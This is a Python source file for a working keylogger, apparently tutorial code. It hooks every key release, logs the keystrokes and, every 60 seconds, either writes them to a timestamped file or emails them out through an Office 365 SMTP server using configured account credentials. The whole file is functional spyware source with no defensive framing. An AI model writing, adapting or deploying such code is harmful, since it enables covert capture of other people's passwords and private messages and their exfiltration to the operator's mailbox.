import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 # Seconds
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"

class Keylogger:
    def __init__(self, interval_sec, report_method="email"):
        self.interval_sec = interval_sec
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval_sec`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event occurs
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name


    def update_filename(self):
        """
        Construct the filename to be identified by start & end datetimes
        """     
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """
        This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable
        """
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        """
        Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email
        """
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        """
        Manages a connection to an SMTP server.
        In our case it's for Microsoft365, Outlook, Hotmail, and live.com
        """
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # Connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # Login to the email account
        server.login(email, password)
        # Send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # Terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def report(self):
        """
        This function gets called every `self.interval_sec`
        Updates the filename, then depending on the report method invokes
        self.sendmail() or self.report_to_file()
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval_sec, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        """
        Starts the keylogger
        """
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


def main():
    keylogger = Keylogger(interval_sec=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()

if __name__ == "__main__":
    main()




